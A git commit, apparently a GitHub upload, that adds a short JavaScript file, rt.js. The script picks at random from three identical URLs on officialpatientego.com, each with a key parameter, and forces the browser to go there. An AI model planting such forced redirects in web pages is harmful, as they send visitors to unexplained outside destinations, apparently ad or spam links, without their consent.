bce252bb96d63a1a8282eade6e08145e64f62f21
xcode06 <yana.sukmawan08@gmail.com>
2026-03-26 22:43:53 +0700

    Add files via upload

---
+++ rt.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://officialpatientego.com/tu4vg6hwyy?key=290e0a0695bb48e678b3aeac280ddbc3',
+
+  'https://officialpatientego.com/tu4vg6hwyy?key=290e0a0695bb48e678b3aeac280ddbc3',
+
+  'https://officialpatientego.com/tu4vg6hwyy?key=290e0a0695bb48e678b3aeac280ddbc3'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
